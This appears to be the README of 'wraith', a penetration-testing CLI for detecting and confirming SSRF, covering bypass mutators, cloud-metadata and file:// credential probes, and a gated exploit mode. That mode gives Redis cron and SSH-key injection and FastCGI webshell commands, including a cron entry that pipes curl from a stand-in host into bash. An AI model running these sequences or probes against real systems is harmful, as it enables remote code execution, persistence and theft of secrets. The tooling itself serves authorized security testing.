# wraith

<p align="center">
  <img src="https://raw.githubusercontent.com/bugsyhewitt/bugsyhewitt.github.io/main/public/cards/wraith.jpg" alt="wraith" width="680">
</p>

SSRF (Server-Side Request Forgery) detection and out-of-band confirmation for
the modern bug-bounty and penetration-testing surface.

wraith resurrects the dead-ancestor SSRF tooling
([SSRFmap](https://github.com/swisskyrepo/SSRFmap),
[Gopherus](https://github.com/tarunkant/Gopherus)) as a headless, CLI-first tool
that owns the 2025-2026 frontier: current cloud-metadata endpoints (AWS IMDSv2,
GCP, Azure, Alibaba, Oracle, DigitalOcean, Hetzner), modern filter bypasses (DNS
rebinding, open-redirect chaining, IPv6 and decimal/octal/hex IP encodings),
out-of-band callback confirmation (interactsh-compatible), `dict://` / `gopher://`
protocol tooling, and the emerging MCP / AI-infrastructure SSRF class.

wraith's defining line is **detect and CONFIRM, not weaponize**: it proves SSRF
(including blind SSRF, via an out-of-band canary) and emits suite-standard
findings. It does not execute code, change target state, use harvested
credentials, or open a reverse shell. Weaponization is a deferred, gated v0.2
concern (see [Roadmap](#roadmap)).

> **Status:** v1.0.0. The detection + confirmation engine is complete and stable:
> filter-bypass mutator catalog, cloud-metadata probes (AWS IMDSv1/IMDSv2,
> GCP, Azure instance + managed-identity, Alibaba, Oracle, DigitalOcean,
> Hetzner), OOB confirmation, `dict://` recon, `gopher://` payload generator,
> MCP catalog and internal-SSRF discovery, `ldap://`/`tftp://`/`file://`
> scheme probes, SSRF-based port scanning, open-redirect chaining,
> `--target-file` multi-target scanning, `--timeout`, weaponized `gopher://`
> exploit sequences (v0.2), SARIF 2.1.0 export, HackerOne markdown output,
> and the Azure managed-identity credential probe (critical severity).
> See [`V0.1-CRITERIA.md`](V0.1-CRITERIA.md) for the v0.1 build contract and
> [`RESEARCH.md`](RESEARCH.md) for the niche brief.

## Ethical Use

You are responsible for ensuring you have authorization to test any target.
Only scan systems you own or have explicit written permission to test. SSRF
testing reaches internal and cloud-metadata surface by design; running it
against unauthorized targets may violate computer-fraud laws. The authors accept
no liability for misuse.

## Install

Requires Python 3.13+.

```bash
git clone https://github.com/bugsyhewitt/wraith
cd wraith
python3 -m venv .venv && source .venv/bin/activate
pip install -e .
```

For the hermetic test stack (respx, pytest-httpserver, pytest-socket, dnslib):

```bash
pip install -e ".[dev]"
```

> **Note:** wraith depends on the shared `scan-primitives` scope-enforced HTTP
> client and `h1-reporter` (both git dependencies), plus `dnslib` (the local OOB
> DNS listener) and `cryptography` (the interactsh-compatible OOB client).

## Scope file format

Scope is safety-critical for offensive tooling: an out-of-scope request is
real-world harm. Every wraith request is checked against a scope allowlist
*before any socket is opened* (enforced by `scan-primitives` once wired).

A plain-text file, one entry per line:
- Hostnames: `api.example.com`
- IP addresses: `10.0.0.1`
- CIDR blocks: `192.168.1.0/24`

Lines starting with `#` are ignored. Example `scope.txt`:

```
# Production targets
api.example.com
10.20.30.0/24

# Staging
staging.example.com
```

Pass it with `--scope-file scope.txt`.

## Usage

wraith is organized into subcommands: `scan` (detect + confirm), `dict`
(read-only recon), and `gopher` (payload generator).

```bash
wraith --version          # -> wraith 1.0.0
wraith --help             # subcommand overview
```

Scope is safety-critical and **required** for `scan` and `dict`: with no
authorized entry wraith refuses to run (fail-closed).

### `wraith scan` -- detect + confirm SSRF

The core engine: run the filter-bypass mutator catalog against a marked
injection point and confirm hits out-of-band.

```bash
# Target URL with an explicit injection marker
wraith scan -u "https://app.example.com/proxy?url=FUZZ" --marker FUZZ \
    --scope-file scope.txt --cloud-metadata --oob https://oob.example.net

# Raw HTTP request file (SSRFmap parity), injection point named by param
wraith scan -r request.txt --param url --oob https://oob.example.net --mcp

# Batch scan: newline-delimited file of target URLs (v0.9)
wraith scan --target-file targets.txt --cloud-metadata --scope-file scope.txt
```

- `-u/--target URL` &mdash; target URL to test.
- `-r/--request-file FILE` &mdash; raw HTTP request to replay (SSRFmap parity).
- `--target-file FILE` &mdash; newline-delimited file of target URLs to scan in
  sequence (v0.9). Each URL must contain the injection marker. Blank lines and
  `#` comment lines are ignored. Findings are accumulated and deduplicated
  across all targets before output. Cannot be combined with `-r/--request-file`.
- `--marker STR` &mdash; token in the URL/request that wraith replaces with each
  payload variant (default `FUZZ`).
- `--param NAME` &mdash; explicitly mark the injection point (query param,
  header, body field, or path segment).
- `--cloud-metadata` &mdash; run the cloud-metadata detection probes.
- `--oob COLLAB_URL` &mdash; interactsh-compatible OOB collaborator for
  blind-SSRF confirmation (a DNS-only callback still counts as CONFIRMED).
- `--mcp` &mdash; enable MCP detection in two modes: (1) probe the SSRF injection
  point for internal MCP servers at well-known discovery paths (`/mcp`, `/__mcp`,
  `/.well-known/mcp.json`, `/api/mcp`, `/v1/mcp`, …) and classify echoed
  responses for MCP protocol signatures; (2) run the 5-CVE MCP catalog against
  the target itself as an MCP server endpoint.
- `--mcp-host HOST` &mdash; internal host to probe for MCP servers via SSRF
  discovery (default: `127.0.0.1`).
- `--mcp-port PORT` &mdash; TCP port for `--mcp-host` (default: omitted).
- `--redirect-url REDIR_URL` &mdash; open-redirect endpoint to chain the SSRF
  through (v0.8). Provide the redirect URL with `FUZZ` where the internal
  target URL should be embedded, e.g.
  `https://trusted.com/redir?next=FUZZ`. Generates 3 redirect-chain variants
  (raw, URL-encoded, double-encoded) per internal target — the highest-priority
  bypass class, placed first in the mutator ordering. Use when the target's
  filter only checks the outer URL's domain.
- `--timeout SECS` &mdash; per-request timeout in seconds (default: `10.0`). Tune
  upward for slow targets (e.g. a 30-second timeout for a target that fetches
  internal URLs asynchronously before responding) or downward to speed up scans
  against fast infrastructure.
- `--format {json,text,h1md,sarif}` &mdash; finding output format.

#### `--target-file` format

A plain-text file, one URL per line. `#` comments and blank lines are skipped.
Every URL must already contain the injection marker (default `FUZZ`):

```
# Production endpoints
https://api.example.com/proxy?url=FUZZ
https://api.example.com/fetch?src=FUZZ

# Staging
https://staging.example.com/webhook?callback=FUZZ
```

Pass it with `--target-file targets.txt`. wraith runs the full scan engine
against each URL and emits a single deduplicated findings list at the end.

### `wraith dict` -- dict:// read-only recon

Read-only `dict://` recon through an SSRF primitive: port/banner grab, Redis
`INFO`, Memcached `stats`. Read-only by definition; no target state change.

```bash
wraith dict -u "https://app.example.com/fetch?url=FUZZ" --scope-file scope.txt
```

### `wraith probe` -- ldap:// / tftp:// non-HTTP scheme recon (v0.4)

Inject non-HTTP scheme URLs at the marked SSRF injection point and classify
echoed responses. Works through curl-backed SSRF sinks and any sink that passes
the injected URL to a scheme-aware fetcher. All probes are read-only.

**`ldap://` (LDAP Root DSE)** — reaches internal LDAP/Active Directory servers;
classifies LDIF-format responses for directory service signatures.

```bash
wraith probe --scheme ldap -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --port 389 --scope-file scope.txt

# With a specific base DN
wraith probe --scheme ldap -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --ldap-base-dn "dc=corp,dc=example" --scope-file scope.txt
```

**`tftp://` (TFTP file-read)** — reaches internal TFTP servers; classifies
file-content signatures for `/etc/passwd` (Unix hosts) and `/boot.ini` (Windows).

```bash
wraith probe --scheme tftp -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --scope-file scope.txt

# Probe multiple files
wraith probe --scheme tftp -u "https://app.example.com/fetch?url=FUZZ" \
  --host 10.0.0.5 --tftp-files "/etc/passwd,/boot.ini" --scope-file scope.txt
```

### `wraith probe --scheme file` -- file:// local file read via SSRF (v0.7)

Inject `file://` URLs at the marked SSRF injection point and classify echoed
responses for local-file-content signatures. If the SSRF sink is curl-backed
without a `--proto` scheme allowlist, the server reads its own local filesystem
and may echo sensitive file content through the injection point. Produces a
`critical`-severity finding on confirmation.

Works through curl-backed SSRF sinks (the most common class). Sinks with strict
scheme restrictions (`--proto 'https'`) return an error safely; wraith treats those
as no-hit and moves on. All probes are read-only.

```bash
# Default paths: /etc/passwd, /etc/hosts, /proc/version
wraith probe --scheme file -u "https://app.example.com/fetch?url=FUZZ" \
  --scope-file scope.txt

# Custom paths (Unix + Windows)
wraith probe --scheme file -u "https://app.example.com/fetch?url=FUZZ" \
  --file-paths "/etc/passwd,/etc/shadow,/proc/self/environ" \
  --scope-file scope.txt

# Windows targets
wraith probe --scheme file -u "https://app.example.com/fetch?url=FUZZ" \
  --file-paths "C:/Windows/win.ini,C:/Windows/System32/drivers/etc/hosts" \
  --scope-file scope.txt
```

Parameters:
- `--file-paths PATHS` — comma-separated list of local file paths to probe
  (default: `/etc/passwd,/etc/hosts,/proc/version`)

### `wraith gopher` -- gopher:// payload generator

Generate a `gopher://` payload (RESP / FastCGI byte encoding, correct `%0d%0a`,
single/double URL-encode toggle) and print it for the operator. **Dry-run only**
in v0.1 -- it emits a payload, it never fires a weaponized sequence.

```bash
wraith gopher --protocol redis --command "SET foo bar"   # Redis RESP payload
wraith gopher --protocol redis --command "INFO" --host 10.0.0.5 --port 6379
wraith gopher --protocol fastcgi --double-encode --script /var/www/html/index.php
```

The output is a `gopher://` URL with correct `%0d%0a` CRLF encoding, printed for
the operator to place into a confirmed SSRF primitive. wraith **never fires it**.

## Exploit Mode (v0.2)

> **Ethical-use warning:** `--exploit` fires live attack payloads that may
> cause remote code execution, privilege escalation, or data loss on the target
> system. Only use this against systems you own or have explicit written
> permission to test. The authors accept no liability for misuse.

wraith v0.2 adds three weaponized `gopher://` exploit sequences behind an
explicit `--exploit` gate. The gate is a double opt-in:

1. Pass `--exploit` on the command line (without it, the subcommand exits 2).
2. Confirm the prompt that warns you live payloads are about to fire (or pass
   `--yes`/`-y` to skip it for scripted/CI use).

```bash
wraith exploit --exploit --yes --sequence redis-ssh \
    --exploit-redis-ssh-key "ssh-rsa AAAA... attacker@evil" \
    --host 127.0.0.1 --port 6379
```

### Sequences

#### `redis-cron` — Redis cron-job injection

Encodes a `CONFIG SET dir` + `CONFIG SET dbfilename` + `BGSAVE` sequence that
writes an RDB dump containing a cron entry into `/etc/cron.d/` (or a custom
dir). Requires a confirmed SSRF that reaches a Redis instance with write
permissions.

```bash
wraith exploit --exploit --yes \
    --sequence redis-cron \
    --exploit-redis-cron-dir /etc/cron.d/ \
    --exploit-redis-cron-entry "* * * * * root curl http://cb.example.com/shell|bash" \
    --host 127.0.0.1 --port 6379
```

Parameters:
- `--exploit-redis-cron-dir DIR` — cron drop directory (default: `/etc/cron.d/`)
- `--exploit-redis-cron-entry ENTRY` — cron line(s) to inject (required)

#### `redis-ssh` — Redis SSH authorized_keys injection

Encodes a sequence that writes an attacker SSH pubkey into
`/root/.ssh/authorized_keys` by setting `CONFIG SET dir /root/.ssh/` +
`CONFIG SET dbfilename authorized_keys` + `BGSAVE`.

```bash
wraith exploit --exploit --yes \
    --sequence redis-ssh \
    --exploit-redis-ssh-key "ssh-rsa AAAAB3NzaC1yc2EAAAA... attacker@evil" \
    --host 127.0.0.1 --port 6379
```

Parameters:
- `--exploit-redis-ssh-key PUBKEY` — SSH public key to inject (required)

#### `fastcgi-rce` — FastCGI php-fpm RCE

Encodes a FastCGI FCGI_PARAMS request with `SCRIPT_FILENAME` pointing at a
writable PHP path and `PHP_VALUE auto_prepend_file=php://input`, passing a
`<?php system('...')?>` webshell as `FCGI_STDIN`. Targets unprotected
`php-fpm` sockets reachable via the SSRF.

```bash
wraith exploit --exploit --yes \
    --sequence fastcgi-rce \
    --exploit-fcgi-cmd "id" \
    --exploit-fcgi-webshell-path /var/www/html/shell.php \
    --host 127.0.0.1 --port 9000
```

Parameters:
- `--exploit-fcgi-cmd CMD` — shell command to execute (required)
- `--exploit-fcgi-webshell-path PATH` — `SCRIPT_FILENAME` for the FastCGI
  request (default: `/var/www/html/shell.php`)

### Firing through an SSRF injection point

All three sequences output the generated `gopher://` URL to stdout. Pass
`--target` to have wraith inject it through a confirmed SSRF primitive
(scope-enforced via `--scope-file`):

```bash
wraith exploit --exploit --yes \
    --sequence redis-ssh \
    --exploit-redis-ssh-key "ssh-rsa AAAA... attacker@evil" \
    --host 127.0.0.1 \
    -u "https://app.example.com/fetch?url=FUZZ" \
    --scope-file scope.txt
```

### `--yes` / `-y` — skip confirmation for scripted use

For CI pipelines or automated exploitation chains, pass `--yes` (or `-y`) to
skip the interactive confirmation prompt. Never pipe `--yes` blindly — the
prompt exists to prevent accidental use.

## Modules

| Module | Role | Status |
|---|---|---|
| `wraith.findings` | The pinned suite `Finding` dataclass (lowercase severity, confidence, `cwe_id=918`, OOB proof). | implemented |
| `wraith.sarif` | `to_sarif(findings) -> dict` &mdash; SARIF 2.1.0 export. | implemented |
| `wraith.reporting` | `to_h1md(findings) -> str` &mdash; HackerOne markdown via `h1-reporter`. | implemented |
| `wraith.client` | Scope-enforced HTTP boundary (wired to `scan-primitives`). | implemented |
| `wraith.mutators` | Filter-bypass variant catalog (IP encodings, `@`/`#`/`\`, CRLF, scheme, rebind, open-redirect chaining). | implemented |
| `wraith.metadata` | Cloud-metadata probes (AWS IMDSv1/IMDSv2, GCP, Azure instance + managed-identity, Alibaba, Oracle, DigitalOcean, Hetzner). | implemented |
| `wraith.oob` | OOB confirmation: local dnslib+HTTP collaborator + interactsh-compatible client. | implemented |
| `wraith.engine` | Scan orchestration: request-file parsing, injection, concurrent detect/confirm. | implemented |
| `wraith.protocols` | `dict://` recon + `gopher://` payload generator (RESP / FastCGI) + `ldap://` / `tftp://` / `file://` scheme probes. | implemented |
| `wraith.mcp` | Version-gated MCP / AI-infra SSRF catalog (5 signatures) + internal MCP server discovery via SSRF (`detect_mcp_server_response`, `mcp_ssrf_urls`). | implemented |
| `wraith.cli` | argparse CLI: `scan` / `dict` / `gopher` / `exploit`. | implemented |
| `wraith.exploit` | Weaponized gopher:// sequences: Redis cron/SSH injection, FastCGI RCE (v0.2, `--exploit` gate). | implemented |

## Example output

A confirmed cloud-metadata SSRF renders to HackerOne markdown (`--format h1md`)
as:

```markdown
# wraith SSRF findings

**Total findings:** 1

## Finding 1: SSRF to AWS IMDS via url query parameter

**Severity:** HIGH

### Description

SSRF reached `https://app.example.com/proxy?url=http://169.254.169.254/latest/meta-data/`
via the `query:url` injection point. Filter-bypass variant: `dword-decimal:2852039166`.
Confirmed out-of-band -- the server initiated a callback to the wraith canary.
...
```

The same finding exports to SARIF 2.1.0 via `--format sarif` for GitHub Code
Scanning / IDE ingestion, and to JSON via `--format json`.

## Development

```bash
pip install -e ".[dev]"

# Fast unit tier (no network, no build) -- the finding/SARIF/h1md tests:
pytest -m "not ship_gate"

# Full suite incl. the wheel ship-gate (builds + installs into a fresh venv):
pytest
```

The unit tier runs with sockets disabled (via `pytest-socket`, when installed)
so any accidental real egress fails loudly -- the enforcement baseline for the
hermetic test tiers described in `V0.1-CRITERIA.md`.

## Roadmap

v0.1 implemented the detection/confirmation engine per
[`V0.1-CRITERIA.md`](V0.1-CRITERIA.md). v0.2 shipped the weaponized
`gopher://` exploit sequences (see [Exploit Mode](#exploit-mode-v02)).
v0.3 added MCP internal-SSRF discovery (`--mcp` now probes the injection
point for internal MCP servers at well-known paths, not just the target as
an MCP server). v0.4 adds **`ldap://` and `tftp://` scheme probes** (`wraith
probe --scheme ldap|tftp`): inject non-HTTP scheme URLs at the marked SSRF
injection point and classify LDAP Root DSE (LDIF signatures) or TFTP
file-content (`/etc/passwd`, `/boot.ini`) in the echoed response. Works
through curl-backed SSRF sinks. v0.5 completes the **cloud-metadata catalog**
(Hetzner — catalog now covers 7 providers). v0.6 adds **SSRF-based internal
port scanning** (`wraith portscan`): fire `http://<host>:<port>/` at the
marked SSRF injection point for each target port and classify results as OPEN /
FILTERED / CLOSED using response-time and service-banner differentials. 25
default ports; accepts `--ports 80,443,6379` or `--ports 8000-8100`. Emits
medium (banner-confirmed) or info (anomalous timing) findings. v0.7 adds
**`file://` SSRF detection** (`wraith probe --scheme file`): inject
`file:///path` at the SSRF injection point and classify echoed responses for
local-file-content signatures (`/etc/passwd`, `/etc/hosts`, `/proc/version`,
`/proc/self/environ`, and Windows equivalents). Critical-severity finding when
confirmed; read-only by nature. v0.8 adds **open-redirect chaining**
(`--redirect-url`): when a known open-redirect on a trusted domain is
available, wraith generates three bypass variants (raw, URL-encoded,
double-encoded) for each internal SSRF target and places them at the head of
the mutator ordering. Bypasses domain-allowlist filters that only check the
outer URL's hostname. v0.9 adds **`--target-file` multi-target scanning**:
pass a newline-delimited file of target URLs to `wraith scan` and wraith runs
the full scan engine against each one in sequence, accumulating and
deduplicating findings before emitting the combined result. Blank lines and `#`
comments are ignored. Cannot be combined with `-r/--request-file`. v0.9.1 adds
**`--timeout` for `wraith scan`**: expose the per-request timeout (previously
hardcoded at 10 s) so operators can tune it upward for slow internal targets or
downward for fast infrastructure. v0.9.2 adds **Azure managed-identity
credential endpoint**: the IMDS credential probe at
`169.254.169.254/metadata/identity/oauth2/token` is now in both the direct
probe catalog and the via-SSRF injection list; finding severity is `critical`
(harvested OAuth2 access_token, not mere identity metadata). The via-SSRF
classifier checks `azure-managed-identity` before `gcp` to prevent token
response misclassification (both return `access_token`; only Azure MI returns
the disambiguating `resource` field).

The following remain **deferred** post-v0.9:

- **Weaponized `gopher://` `MODULE LOAD`** &mdash; dynamically loaded Redis
  modules for more capable post-exploitation.
- **Using harvested cloud credentials** (SDK calls to enumerate/exfil)
  &mdash; detection emits the finding; credential use is a separate dangerous
  pivot.
- **Reverse-shell / connect-back listener** &mdash; weaponization.
- **Request-smuggling desync** to reach enforced IMDSv2 &mdash; that is
  `doppelganger`'s surface.
- **Self-hosted DNS-rebinding orchestration** &mdash; v0.1 may *emit* rebind
  hostnames pointing at public rebind services; hosting the flip is deferred.
- **Full CVE template library** &mdash; seed a handful, defer the catalog.
- Extended protocol weaponization (MySQL/Postgres/Zabbix/Memcached), advanced
  WAF-evasion beyond the core mutators, and GUI/proxy integration.

## License

MIT &mdash; see [LICENSE](LICENSE).

## Attribution

wraith stands on the shoulders of prior SSRF work:

- **[SSRFmap](https://github.com/swisskyrepo/SSRFmap)** by Swissky &mdash; the
  dead-ancestor SSRF scanner; the source of the raw-request + injection-marker
  workflow and the bypass-pattern catalog wraith modernizes.
- **[Gopherus](https://github.com/tarunkant/Gopherus)** by Tarun Kant Gupta
  &mdash; the reference for `gopher://` RESP / FastCGI payload structure.
- **[interactsh](https://github.com/projectdiscovery/interactsh)** by
  ProjectDiscovery &mdash; the out-of-band interaction protocol wraith's OOB
  confirmation engine speaks.
- Cloud-metadata and MCP SSRF technique authors cited inline in
  [`RESEARCH.md`](RESEARCH.md) and against the specific CVEs in
  [`V0.1-CRITERIA.md`](V0.1-CRITERIA.md) (e.g. Typebot IMDSv2 header-injection
  CVE-2025-64709; Fetch MCP CVE-2025-65513; MCP-Atlassian CVE-2026-27826;
  LangChain `RecursiveUrlLoader` CVE-2026-26019 / -27795).

See NOTICE for details where applicable.
